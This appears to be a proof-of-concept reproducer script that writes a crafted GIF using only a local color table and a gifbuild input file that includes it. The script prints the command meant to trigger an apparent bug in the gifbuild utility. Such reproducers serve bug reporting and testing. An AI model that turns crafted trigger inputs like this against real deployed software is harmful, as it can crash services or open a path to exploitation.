
from pathlib import Path


def build_local_only_gif() -> bytes:
    out = bytearray()
    out += b"GIF89a"

    # Logical Screen Descriptor: width=1, height=1
    out += (1).to_bytes(2, "little")
    out += (1).to_bytes(2, "little")

    # Packed field: no global color table
    out += b"\x00"

    # Background color index, pixel aspect ratio
    out += b"\x00\x00"

    # Image Descriptor
    out += b"\x2c"                  # image separator
    out += b"\x00\x00"              # left
    out += b"\x00\x00"              # top
    out += b"\x01\x00"              # width = 1
    out += b"\x01\x00"              # height = 1

    # Packed field: local color table present, 2 entries
    out += b"\x80"

    # Local Color Table: black, white
    out += b"\x00\x00\x00\xff\xff\xff"

    # Image Data
    out += b"\x02\x02\x4c\x01\x00"

    # Trailer
    out += b"\x3b"
    return bytes(out)


def build_gifbuild_text(include_name: str) -> str:
    return (
        "screen width 1\n"
        "screen height 1\n"
        "screen colors 2\n"
        "screen background 0\n"
        "pixel aspect byte 0\n"
        "\n"
        "screen map\n"
        "\tsort flag off\n"
        "\trgb 000 000 000\n"
        "\trgb 255 255 255\n"
        "end\n"
        "\n"
        f"include {include_name}\n"
    )


def main() -> int:
    gif_path = Path("local_only.gif")
    txt_path = Path("repro_gifbuild_local_only.txt")

    gif_path.write_bytes(build_local_only_gif())
    txt_path.write_text(build_gifbuild_text(gif_path.name), encoding="utf-8")

    print(f"[+] wrote {gif_path}")
    print(f"[+] wrote {txt_path}")
    print("[+] intended trigger: ./gifbuild < repro_gifbuild_local_only.txt > /dev/null")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
